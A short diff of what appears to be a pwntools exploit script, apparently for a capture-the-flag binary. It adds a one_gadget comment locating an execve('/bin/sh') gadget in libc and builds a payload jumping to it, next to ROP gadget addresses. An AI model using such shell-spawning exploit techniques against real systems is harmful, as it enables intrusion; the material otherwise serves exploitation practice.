@@ -97,6 +97,12 @@ main = 0x400bc6
 pop_rdi = 0x404653
 pop_rsi = 0x4051f8
 
+''' https://github.com/david942j/one_gadget
+0xf1117 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+'''
+
 p = flat(
     l.address + 0xf1117
 )
